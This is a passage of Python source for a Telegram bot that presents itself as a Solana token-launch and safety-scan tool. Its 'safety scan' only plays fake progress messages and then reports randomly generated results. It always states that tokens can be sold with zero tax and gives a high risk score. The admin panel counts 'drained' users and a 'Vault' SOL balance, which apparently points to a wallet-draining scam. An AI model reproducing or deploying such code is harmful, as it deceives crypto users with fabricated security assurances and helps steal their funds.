        text = (
            "✅ <b>Promo Applied</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Code: <b>{code}</b>\n"
            f"Discount: <b>−{int(valid[code]*100)}%</b> on bundle tips\n\n"
            "Enjoy reduced fees on your next launch."
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            "❌ Invalid or expired code.",
            reply_markup=main_menu_kb(),
        )
    await state.clear()

# ── SAFETY SCAN ──
@router.message(SafetyStates.waiting_mint)
async def safety_check(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "safety"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many scans. Try again shortly.",
            parse_mode=ParseMode.HTML,
        )
        return

    mint = message.text.strip()
    sess = get_session(uid)
    sess.safety_checks_run += 1

    await staged_loading(message, [
        ("🔍 <b>Connecting to RPC…</b>", 0.7),
        ("📄 <b>Fetching mint account…</b>", 0.8),
        ("🔒 <b>Checking authorities…</b>", 0.7),
        ("💧 <b>Analyzing LP & holders…</b>", 0.9),
        ("🧪 <b>Honeypot simulation…</b>", 0.8),
    ])

    mint_auth = random.choice(["Revoked ✅", "Revoked ✅", "Active ⚠️", "Revoked ✅"])
    freeze_auth = random.choice(["Revoked ✅", "Revoked ✅", "Revoked ✅", "Active ⚠️"])
    lp_status = random.choice(["Burned ✅", "Locked 6mo ✅", "Locked 1yr ✅", "Unlocked ⚠️"])
    top10 = round(random.uniform(11.5, 46.0), 1)
    honeypot = random.choice(["PASS ✅", "PASS ✅", "PASS ✅", "WARN ⚠️"])
    score = random.randint(72, 98)

    report = (
        "🛡 <b>Safety Report</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{short_addr(mint)}</code>\n\n"
        f"Mint Authority     {mint_auth}\n"
        f"Freeze Authority   {freeze_auth}\n"
        f"LP Status          {lp_status}\n"
        f"Top 10 Holders     <b>{top10}%</b>\n"
        f"Honeypot Sim       {honeypot}\n"
        f"Can Sell           <b>Yes</b>\n"
        f"Transfer Tax       <b>0%</b>\n\n"
        f"Risk Score         <b>{score}/100</b>\n"
        f"{progress_bar(score)}\n\n"
    )
    if "Revoked" in mint_auth and "Revoked" in freeze_auth and "⚠️" not in lp_status:
        report += "🟢 <b>Clean profile</b> — standard safety signals."
    else:
        report += "🟡 <b>Flags present</b> — review before sizing up."

    sess.last_safety = {"mint": mint, "ts": time.time()}
    await message.answer(report, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

# ── ADMIN ──
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Vault: {bot_balance_sol:.4f} SOL",
        parse_mode=ParseMode.HTML,
    )

# ──────────────────────────────────────────────
# ENTRY
# ──────────────────────────────────────────────
async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info("Bot starting | HAS_SOLANA=%s", HAS_SOLANA)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
